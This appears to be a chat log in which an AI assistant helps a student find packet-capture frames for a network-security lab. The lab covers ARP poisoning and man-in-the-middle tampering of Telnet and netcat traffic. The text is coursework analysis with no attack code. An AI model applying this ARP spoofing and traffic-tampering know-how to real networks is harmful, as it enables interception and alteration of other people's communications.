**Summary for Export (for analysis ONLY, NOT submission):**

If you were to export *only* the key packets representing the successful generation of the required Task 1 ARP types, you would export:

*   **Frame 1**
*   **Frame 127**
*   **Frame 224**

Again, **do not submit a file containing only these frames.** Submit the full capture.

Okay, let's double-check using this new, more complete screenshot of the ARP packets.

*   **Task 1.A (ARP Request: Who has 10.9.0.5? Tell 10.9.0.6):**
    *   Looking for `Src: 02:42:0a:09:00:69`, `Dst: 02:42:0a:09:00:05`, `Info: Who has 10.9.0.5? Tell 10.9.0.6`.
    *   **Frame 1** still matches this perfectly.

*   **Task 1.B (ARP Reply: 10.9.0.6 is at 02:42:0a:09:00:69):**
    *   Looking for `Src: 02:42:0a:09:00:69`, `Dst: 02:42:0a:09:00:05`, `Info: 10.9.0.6 is at 02:42:0a:09:00:69`.
    *   **Frame 24** is the first occurrence.
    *   **Frame 200**, **201**, **203**, **210**, **224**, **245**, **247**, **249** also match this pattern (these are likely from your poisoning scripts or `task1b.py` runs).
    *   The previously identified **Frame 224** is definitely one valid example. Any of these frames demonstrate the correct packet structure for the Task 1B requirement.

*   **Task 1.C (Gratuitous ARP Request for 10.9.0.6):**
    *   Looking for `Src: 02:42:0a:09:00:69`, `Dst: Broadcast`, `Info: Gratuitous ARP for 10.9.0.6 (Request)`.
    *   **Frame 127** matches this perfectly.
    *   **Frame 177** also matches this perfectly.
    *   The previously identified **Frame 127** (or 177) is a valid example.

**Conclusion:**

Yes, your previous identification looks good and is consistent with this fuller view. The key packets representing the specific requirements for each part of Task 1 are indeed present:

*   Task 1A: **Frame 1**
*   Task 1B: **Frame 224** (or Frame 24, 200, 201, 203, 210, 245, 247, 249)
*   Task 1C: **Frame 127** (or Frame 177)

Since all required packet types for all tasks (1, 2, and 3) seem to be present in your capture, and you've confirmed it's `.pcap`, the focus really shifts heavily onto the `settings.txt` file being absolutely perfect (no hidden characters, correct line endings, correct case, exact filename) or a potential issue with the autograder itself.

what about frames for 2 and 3?

### Assistant (gemini-2.5-pro)

Okay, let's pinpoint the key representative frames for Tasks 2 and 3 based on your previous screenshots.

**Again, the crucial reminder:** Do **NOT** submit a file containing only these frames. Submit the full, continuous capture. This list is for verification.

**Task 2 (Telnet MITM - Q -> Z):**

The autograder needs to see the sequence of Host A sending 'Q', Host M modifying it to 'Z' and sending to B, Host B echoing 'Z', and Host M forwarding the echo 'Z' back to A.

*   **Packet A -> M (with 'Q'):**
    *   IP Src: `10.9.0.5`, IP Dst: `10.9.0.6`
    *   Eth Src: `MAC_A` (`02:42:0a:09:00:05`), Eth Dst: `MAC_M` (`02:42:0a:09:00:69`)
    *   TCP Dst Port: 23, Payload: 'Q' (hex `51`)
    *   **Your Frame Number:** **Frame 662**
*   **Packet M -> B (with 'Z'):**
    *   IP Src: `10.9.0.5`, IP Dst: `10.9.0.6`
    *   Eth Src: `MAC_M` (`02:42:0a:09:00:69`), Eth Dst: `MAC_B` (`02:42:0a:09:00:06`)
    *   TCP Dst Port: 23, Payload: 'Z' (hex `5a`)
    *   **Your Frame Number:** **Frame 663**
*   **Packet B -> M (Echo 'Z'):**
    *   IP Src: `10.9.0.6`, IP Dst: `10.9.0.5`
    *   Eth Src: `MAC_B` (`02:42:0a:09:00:06`), Eth Dst: `MAC_M` (`02:42:0a:09:00:69`)
    *   TCP Src Port: 23, Payload: 'Z' (hex `5a`)
    *   **Your Frame Number:** **Frame 665**
*   **Packet M -> A (Forward Echo 'Z'):**
    *   IP Src: `10.9.0.6`, IP Dst: `10.9.0.5`
    *   Eth Src: `MAC_M` (`02:42:0a:09:00:69`), Eth Dst: `MAC_A` (`02:42:0a:09:00:05`)
    *   TCP Src Port: 23, Payload: 'Z' (hex `5a`)
    *   **Your Frame Number:** **Frame 666**

**Task 3 (Netcat MITM - student ID -> aaaaaa):**

The autograder needs to see Host A sending your student ID and Host M modifying it and sending the 'a' string to Host B.

*   **Packet A -> M (with student ID):**
    *   IP Src: `10.9.0.5`, IP Dst: `10.9.0.6`
    *   Eth Src: `MAC_A` (`02:42:0a:09:00:05`), Eth Dst: `MAC_M` (`02:42:0a:09:00:69`)
    *   TCP Dst Port: 9090, Payload: `iae225\n` (hex `69 61 65 32 32 35 0a`)
    *   **Your Frame Number:** **Frame 1315**
*   **Packet M -> B (with 'aaaaaa'):**
    *   IP Src: `10.9.0.5`, IP Dst: `10.9.0.6`
    *   Eth Src: `MAC_M` (`02:42:0a:09:00:69`), Eth Dst: `MAC_B` (`02:42:0a:09:00:06`)
    *   TCP Dst Port: 9090, Payload: `aaaaaa\n` (hex `61 61 61 61 61 61 0a`)
    *   **Your Frame Number:** **Frame 1316**

**Summary for Export (for analysis ONLY, NOT submission):**

If you were exporting only the key packets for Tasks 2 and 3:

*   Task 2: Frames **662, 663, 665, 666**
*   Task 3: Frames **1315, 1316**

Combining with Task 1, the essential representative frames across all tasks in your capture are roughly: 1, 127, 224, 662, 663, 665, 666, 1315, 1316. But again, submit the whole file!
